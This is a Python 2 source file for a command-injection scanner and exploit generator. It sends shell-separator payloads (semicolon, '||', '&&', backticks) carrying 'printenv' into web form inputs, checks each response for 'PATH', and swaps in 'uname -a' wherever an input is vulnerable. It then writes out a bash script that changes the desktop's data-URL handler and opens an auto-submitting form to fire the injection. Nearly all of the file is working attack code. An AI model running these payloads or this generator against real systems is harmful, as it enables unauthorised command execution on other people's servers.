import json
from urllib2 import urlopen
import difflib

class CommandInjectionScanner:
    className = 'Command Injection'
    payloads = [';%s', '%%26%s', '%%26%%26%s', '||%s',
            '`%s`', '`%s >/proc/$$/fd/1`']
    testPayload = 'printenv'
    testSignature = 'PATH'
    realPayload = 'uname -a'

    def __init__(self, targetsFile):
        with open(targetsFile) as json_file:
            self.targets = json.load(json_file)

    def _urlopen(self, target, data):
        data = '&'.join(['%s=%s' % (key, data[key]) for key in data])
        if target['method'] == 'GET':
            resp = urlopen(target['action'] + '?' + data)
        else:
            resp = urlopen(target['action'], data=data)
        return resp.read()

    def _vulnerable(self, target, data):
        try:
            return self._urlopen(target, data).find(self.testSignature) > -1
        except:
            return False

    def scanVulnerabilities(self):
        results = { 'class': self.className, 'results': {} }
        for target in self.targets:
            url = target['action'].split('//')
            domain = url[0] + '//' + \
                    url[-1].split('?')[0].split('#')[0].split('/')[0]
            vulnerabilities = []
            for param in target['inputs']:
                params = { key['name']: '1' for key in target['inputs'] }
                for payload in self.payloads:
                    if self._vulnerable(target, {
                            param['name']: payload % self.testPayload }):
                        vulnerabilities.append({
                            'endpoint': target['action'][len(domain):],
                            'params': {
                                param['name']: payload % self.realPayload },
                            'method': target['method']
                        })
                        break
                    params[param['name']] = payload % self.testPayload
                    if self._vulnerable(target, params):
                        params[param['name']] = payload % self.realPayload
                        vulnerabilities.append({
                            'endpoint': target['action'][len(domain):],
                            'params': params,
                            'method': target['method']
                        })
                        break
                else: continue
                break
            if vulnerabilities:
                if domain not in results['results']:
                    results['results'][domain] = []
                results['results'][domain].extend(vulnerabilities)
        return results

    def generateExploit(self, domain, vulnerability):
        action = domain + vulnerability['endpoint']
        params = vulnerability['params']
        method = vulnerability['method']
        return '\n'.join([
            '#!/bin/bash',
            'xdg-mime default `xdg-mime query default x-scheme-handler/http` \
                    x-scheme-handler/data',
            '',
            'python <(cat <<EOF',
            'from urllib import quote',
            'import webbrowser',
            '',
            'html = \'<form method=%s action=%s>' % (method, action) + \
                    ''.join(['<input name=%s value="%s">' % (k, params[k])
                        for k in params]) + \
                    '</form><script>document.forms[0].submit()</script>\'',
            'webbrowser.open_new_tab("data:text/html," + quote(html))',
            'EOF',
            ')',
            ''])
